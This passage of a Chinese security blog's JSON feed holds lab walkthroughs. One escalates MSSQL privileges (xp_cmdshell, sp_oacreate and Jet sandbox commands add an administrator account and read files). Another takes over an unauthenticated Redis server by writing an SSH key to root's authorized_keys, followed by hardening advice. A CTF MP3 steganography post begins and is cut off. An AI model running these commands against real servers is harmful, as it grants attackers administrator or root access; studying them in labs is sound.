sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#比如，账户名是HeyJack 密码也是HeyJack</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212339481.png\" alt=\"image-20220927212339481\"></p>\n<p>此时，我们在 windows 的 cmd 里，执行 net user</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。</span></span><br><span class=\"line\">net user</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212609276.png\" alt=\"image-20220927212609276\"></p>\n<p>&quot;开始&quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于</p>\n<p>查看当前分组在 Users 组</p>\n<p><img src=\"image-20220927212746484.png\" alt=\"image-20220927212746484\"></p>\n<h3 id=\"4第四步将你新建的用户移到administrators组\"><a class=\"markdownIt-Anchor\" href=\"#4第四步将你新建的用户移到administrators组\">#</a> ④第四步，将你新建的用户移到 administrators 组</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927213122417.png\" alt=\"image-20220927213122417\"></p>\n<p>继续查看我们的分组情况，可以看到，提权成功：</p>\n<p><img src=\"image-20220927213219218.png\" alt=\"image-20220927213219218\"></p>\n<h3 id=\"5第五步获取远程服务器中的目标文件\"><a class=\"markdownIt-Anchor\" href=\"#5第五步获取远程服务器中的目标文件\">#</a> ⑤第五步，获取远程服务器中的目标文件</h3>\n<p>我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 <code>最终目的</code> 就是<strong>为了获取它</strong>。</p>\n<p><img src=\"image-20220927221944235.png\" alt=\"image-20220927221944235\"></p>\n<h4 id=\"第一种方案3389远程连接\"><a class=\"markdownIt-Anchor\" href=\"#第一种方案3389远程连接\">#</a> 第一种方案，3389 远程连接</h4>\n<p>在 win+R 输入 <code>mstsc</code></p>\n<p><img src=\"image-20220927213803912.png\" alt=\"image-20220927213803912\"></p>\n<p>查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取</p>\n<p><img src=\"image-20220927221540178.png\" alt=\"image-20220927221540178\"></p>\n<p>然后 3389 远程连接</p>\n<p><img src=\"image-20220927213905588.png\" alt=\"image-20220927213905588\"></p>\n<p>输入刚刚新建的用户民和密码</p>\n<p><img src=\"image-20220927214036680.png\" alt=\"image-20220927214036680\"></p>\n<p>登录成功</p>\n<p><img src=\"image-20220927214149105.png\" alt=\"image-20220927214149105\"></p>\n<p>然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt</p>\n<p><img src=\"image-20220927221815971.png\" alt=\"image-20220927221815971\"></p>\n<h4 id=\"第二种方案使用sql提权命令获取内容\"><a class=\"markdownIt-Anchor\" href=\"#第二种方案使用sql提权命令获取内容\">#</a> 第二种方案，使用 SQL 提权命令获取内容</h4>\n<p>另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#dir命令查看当前路径</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;dir&#x27;</span>;</span><br><span class=\"line\">#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\\Documents <span class=\"keyword\">and</span> Settings\\桌面\\flag.txt</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\Administrator\\桌面\\flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927221113281.png\" alt=\"image-20220927221113281\"></p>\n<h2 id=\"0x03-sp_oacreate提权步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x03-sp_oacreate提权步骤\">#</a> 0x03 sp_oacreate 提权步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1-2\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1-2\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2第二步配置ole过程\"><a class=\"markdownIt-Anchor\" href=\"#2第二步配置ole过程\">#</a> ②第二步，配置 OLE 过程</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3第三步定义shell变量int类型\"><a class=\"markdownIt-Anchor\" href=\"#3第三步定义shell变量int类型\">#</a> ③第三步，定义 shell 变量，int 类型。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4第四步生成shell对象\"><a class=\"markdownIt-Anchor\" href=\"#4第四步生成shell对象\">#</a> ④第四步，生成 shell 对象</h3>\n<p>将结果赋值给第③步生成的 shell 变量里头。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5第五步调用shell对象的run方法来调用net-user\"><a class=\"markdownIt-Anchor\" href=\"#5第五步调用shell对象的run方法来调用net-user\">#</a> ⑤第五步，调用 shell 对象的 run 方法来调用 net user</h3>\n<p>返回值是 null，方法体是执行 system32 目录下的 cmd.exe，并使用 net user 生成 HeyJack1 账号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net user HeyJack1 HeyJack1 /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927230925606.png\" alt=\"image-20220927230925606\"></p>\n<h3 id=\"6第六步调用shell对象的run方法来调用net-localgroup\"><a class=\"markdownIt-Anchor\" href=\"#6第六步调用shell对象的run方法来调用net-localgroup\">#</a> ⑥第六步，调用 shell 对象的 run 方法来调用 net localgroup</h3>\n<p>返回值是 null，方法体是执行 cmd，并使用 net localgroup 将 HeyJack1 挪到 administrators 组下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators HeyJack1 /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927231033604.png\" alt=\"image-20220927231033604\"></p>\n<p>以上是使用 sp_oacreate 的提权语句，主要是用来调用 OLE 对象（Object Linking and Embedding 的缩写，VB 中的 OLE 对象），利用 OLE 对象的 run 方法执行系统命令。</p>\n<p>在 oacreate 的官方文档里明确指出了，如果要使用 OLE 对象，必须要开启 ‘Ole Automation Procedures’，也就是 EXEC sp_configure ‘Ole Automation Procedures’, 1;</p>\n<p><strong>执行上面这条语句前</strong>要执行 <code>exec sp_configure 'show advanced options', 1;</code></p>\n<p><strong>官方对这句话的解释是：</strong> <code>show advanced options</code> ,**“显示高级选项”** 选项用来显示 sp_configure 系统存储过程高级选项。</p>\n<p>当 **“显示高级选项”** 设置为 <code> 1</code>  时，可以使用 sp_configure 列出高级选项。  <code>默认值为 0</code></p>\n<h2 id=\"0x04-沙盒提权步骤不常用\"><a class=\"markdownIt-Anchor\" href=\"#0x04-沙盒提权步骤不常用\">#</a> 0x04 沙盒提权步骤 (不常用)</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--提权语句</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不开启的话在执行xp_regwrite会提示让我们开启，</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ad Hoc Distributed Queries&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_regwrite <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>,<span class=\"string\">&#x27;SandBoxMode&#x27;</span>,<span class=\"string\">&#x27;REG_DWORD&#x27;</span> ,<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.xp_regread <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>, <span class=\"string\">&#x27;SandBoxMode&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--执行系统命令select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user HeyJack2 HeyJack2 /add&quot;)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> openrowset(<span class=\"string\">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class=\"string\">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class=\"string\">&#x27;select shell(&quot;net localgroup administrators HeyJack2 /add&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>沙盒模式 SandBoxMode 参数含义（默认是 2）</p>\n<p><code>0</code> ：在任何所有者中禁止启用安全模式</p>\n<p><code>1</code>  ：为仅在允许范围内</p>\n<p><code>2</code>  ：必须在 access 模式下</p>\n<p><code>3</code> ：完全开启</p>\n<p>openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用程序链接到 SQL Server 的的驱动程序。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--恢复配置</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_regwrite <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>,<span class=\"string\">&#x27;SandBoxMode&#x27;</span>,<span class=\"string\">&#x27;REG_DWORD&#x27;</span> ,<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ad Hoc Distributed Queries&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p>至此，SQL Server (MSSQL) 提权攻击演示完毕。</p>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "Redis提权攻击",
            "date_published": "2022-09-26T16:02:13.000Z",
            "content_html": "<p><strong>Redis</strong>（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI <a href=\"https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80\">C 语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href=\"https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728\"> 数据库</a>，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由<a href=\"https://baike.baidu.com/item/Pivotal\"> Pivotal</a> 赞助。</p>\n<h2 id=\"0x00-redis提权攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x00-redis提权攻击\">#</a> 0x00 Redis 提权攻击</h2>\n<p>​\t<strong>Redis</strong> 在默认情况下，会绑定在 0.0.0.0:<strong>6379</strong> 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 <code>暴露到公网</code> 上。</p>\n<p>​\t如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>\n<p>​\t攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 <code>/root/.ssh</code>  文件夹的 <code>authotrized_keys</code>  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\"><strong>类型</strong></th>\n<th style=\"text-align:left\"><strong>IP</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><strong>目标靶机</strong></td>\n<td style=\"text-align:left\">Ubuntu18.04</td>\n<td style=\"text-align:left\">192.168.138.143</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><strong>攻击主机</strong></td>\n<td style=\"text-align:left\">Kali2022</td>\n<td style=\"text-align:left\">192.168.138.145</td>\n</tr>\n</tbody>\n</table>\n<p>如果没有攻击机没有安装 ssh 则：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">安装</span></span><br><span class=\"line\">sudo apt install openssh-server</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">启动ssh服务</span></span><br><span class=\"line\">sudo service ssh start</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-被攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x01-被攻击机部分准备工作\">#</a> 0x01 被攻击机部分准备工作</h2>\n<p>在 Ubuntu 安装 redis 服务器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212305161.png\" alt=\"image-20220926212305161\"></p>\n<p>修改 /etc/redis/redis.conf，总共有三点：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926212807655.png\" alt=\"image-20220926212807655\"></p>\n<p>①去除 bind</p>\n<p><img src=\"image-20220926213107025.png\" alt=\"image-20220926213107025\"></p>\n<p>②daemonize yes</p>\n<p><img src=\"image-20220926213521318.png\" alt=\"image-20220926213521318\"></p>\n<p>③protected-mode no</p>\n<p><img src=\"image-20220926232253189.png\" alt=\"image-20220926232253189\"></p>\n<p>重启服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">service redis stop</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">以root身份启动redis服务</span></span><br><span class=\"line\">sudo redis-server /etc/redis/redis.conf</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">尝试在服务器上自己连一下</span></span><br><span class=\"line\">redis-cli</span><br><span class=\"line\">(显示127.0.0.1:6379则OK)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232522408.png\" alt=\"image-20220926232522408\"></p>\n<h2 id=\"0x02-攻击机部分准备工作\"><a class=\"markdownIt-Anchor\" href=\"#0x02-攻击机部分准备工作\">#</a> 0x02 攻击机部分准备工作</h2>\n<p>在攻击机上生成 rsa 秘钥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214148985.png\" alt=\"\"></p>\n<p>重定向到 key.txt</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/kali/.ssh</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926214549834.png\" alt=\"image-20220926214549834\"></p>\n<p>第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车</p>\n<p><img src=\"image-20220926214811675.png\" alt=\"image-20220926214811675\"></p>\n<p>之后，我们在攻击机（也就是我的 kali）上安装 redis-cli</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class=\"line\">tar -zxf redis-stable.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进入到 redis-stable 目录</span></span><br><span class=\"line\">cd redis-stable</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译</span></span><br><span class=\"line\">make</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">拷贝</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了</span></span><br><span class=\"line\">sudo cp ./src/redis-cli /usr/bin/</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220032721.png\" alt=\"image-20220926220032721\"></p>\n<p>出现如下字样就说明安装成功：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">redis-cli</span><br><span class=\"line\">回车</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926220238790.png\" alt=\"image-20220926220238790\"></p>\n<p>将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143</p>\n<p><img src=\"image-20220926220116946.png\" alt=\"image-20220926220116946\"></p>\n<h2 id=\"0x03-开始攻击\"><a class=\"markdownIt-Anchor\" href=\"#0x03-开始攻击\">#</a> 0x03 开始攻击</h2>\n<p>拿到 redis 的 shell 后基本操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">info  #查看redis的信息和服务器信息</span><br><span class=\"line\">flushall 删除全部数据</span><br><span class=\"line\">del key  删除键为key的数据</span><br><span class=\"line\">get key  得到参数key的数据</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926234426901.png\" alt=\"image-20220926234426901\"></p>\n<p>在我们的攻击机 (kali) 上运行如下代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test</span><br><span class=\"line\">看到回显了OK以后</span><br><span class=\"line\">redis-cli -h 192.168.138.143进入shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926222112479.png\" alt=\"image-20220926222112479\"></p>\n<p>将目录切换到 /root/.ssh</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926231146929.png\" alt=\"image-20220926231146929\"></p>\n<p>设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232746706.png\" alt=\"\"></p>\n<p>最后，回到生成秘钥的终端：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">使用ssh命令 以root用户的身份 连接“被攻击机”的ip</span></span><br><span class=\"line\">ssh root@192.168.138.143</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220926232832651.png\" alt=\"image-20220926232832651\"></p>\n<p>至此，redis 提权攻击完成。</p>\n<h2 id=\"0x04-修复建议安全加固\"><a class=\"markdownIt-Anchor\" href=\"#0x04-修复建议安全加固\">#</a> 0x04 修复建议 / 安全加固</h2>\n<h3 id=\"1禁止一些高危命令重启redis才能生效\"><a class=\"markdownIt-Anchor\" href=\"#1禁止一些高危命令重启redis才能生效\">#</a> <strong>1. 禁止一些高危命令</strong> (重启 redis 才能生效)</h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>或者另起名字</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">FLUSHALL</span> <span class=\"string\">&quot;name1&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">CONFIG</span> <span class=\"string\">&quot;name2&quot;</span></span><br><span class=\"line\"><span class=\"string\">rename-command</span> <span class=\"string\">EVAL</span> <span class=\"string\">&quot;name3&quot;</span></span><br></pre></td></tr></table></figure>\n<p>来禁用远程修改 DB 文件地址</p>\n<h3 id=\"2以低权限运行-redis-服务\"><a class=\"markdownIt-Anchor\" href=\"#2以低权限运行-redis-服务\">#</a> <strong>2. 以低权限运行 Redis 服务</strong></h3>\n<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>\n<h3 id=\"3为-redis-添加密码验证\"><a class=\"markdownIt-Anchor\" href=\"#3为-redis-添加密码验证\">#</a> <strong>3. 为 Redis 添加密码验证</strong></h3>\n<p>修改 redis.conf 文件，添加</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">requirepass</span> <span class=\"string\">mypassword</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"4禁止外网访问-redis\"><a class=\"markdownIt-Anchor\" href=\"#4禁止外网访问-redis\">#</a> <strong>4. 禁止外网访问 Redis</strong></h3>\n<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">bind</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"string\">::1</span></span><br></pre></td></tr></table></figure>\n<p>redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。</p>\n<h3 id=\"5保证-authorized_keys-文件的安全\"><a class=\"markdownIt-Anchor\" href=\"#5保证-authorized_keys-文件的安全\">#</a> <strong>5. 保证 authorized_keys 文件的安全</strong></h3>\n<p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>\n<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure>\n<p><strong>注意:</strong> 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>\n<h3 id=\"6修改默认端口\"><a class=\"markdownIt-Anchor\" href=\"#6修改默认端口\">#</a> <strong>6. 修改默认端口</strong></h3>\n<p>修改 redis.conf 文件， 找到并修改原来的 <code>port 6379</code>  ，比如改成 <code>port 17033</code> ，让人摸不着头脑。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">port 17033 </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "数据库安全"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/",
            "url": "https://kiyomijin.github.io/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/",
            "title": "Misc——私有bit隐写",
            "date_published": "2022-09-17T06:02:32.000Z",
            "content_html": "<h2 id=\"0x01-知识点\"><a class=\"markdownIt-Anchor\" href=\"#0x01-知识点\">#</a> <strong>0x01 知识点</strong></h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef FrameHeader</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;// 类型     字段名:bit数</span><br><span class=\"line\">unsigned int sync:12;                        //同步信息</span><br><span class=\"line\">unsigned int version:2;                      //版本</span><br><span class=\"line\">unsigned int layer: 2;                       //层</span><br><span class=\"line\">unsigned int error protection:1;             //CRC校验</span><br><span class=\"line\">unsigned int bitrate_index:4;                //位率</span><br><span class=\"line\">unsigned int sampling_frequency:2;           //采样频率</span><br><span class=\"line\">unsigned int padding:1;                      //帧长调节</span><br><span class=\"line\">unsigned int private:1;                      //保留字 【通常藏有flag】</span><br><span class=\"line\">unsigned int mode:2;                         //声道模式</span><br><span class=\"line\">unsigned int mode extension:2;        \t\t //扩充模式</span><br><span class=\"line\">unsigned int copyright:1;                    //版权   【通常藏有flag】</span><br><span class=\"line\">unsigned int original:1;                     //原版标志</span><br><span class=\"line\">unsigned int emphasis:2;                     //强调模式</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>帧长度是压缩时每一帧的长度， <code>包括帧头</code> 的 4 个字节（32bit）。它将填充的空位也计算在内。</li>\n<li>padding 的值会影响每一帧的长度（具体分析见下面的题目），因为只有 1 位，因此长度也只限于在 0 和 1 之间变化</li>\n</ul>\n<h2 id=\"0x02-题目分析\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目分析\">#</a> 0x02 题目分析</h2>\n<p>将解压后的 <code>1.mp3</code>  文件用 010Editor 打开</p>\n<p>可以看到一个 mp3 文件，里面基本上由 mf 数组构成。</p>\n<p><img src=\"image-20220917115510767.png\" alt=\"image-20220917115510767\"></p>\n<p>分析详见图片</p>\n<p><img src=\"image-20220917120013835.png\" alt=\"image-20220917120013835\"></p>\n<p>接着，可以发现，每个 mf 数组大小不一，有的是 0x1A1，有的 0x1A2</p>\n<p><img src=\"image-20220917120301874.png\" alt=\"image-20220917120301874\"></p>\n<blockquote>\n<p>图中可知，private_bit 的数值的在 0 和 1 中变化，可以让 <code>copyright</code>  、 <code>private_bit</code>  这样的单 bit 位在 0 和 1 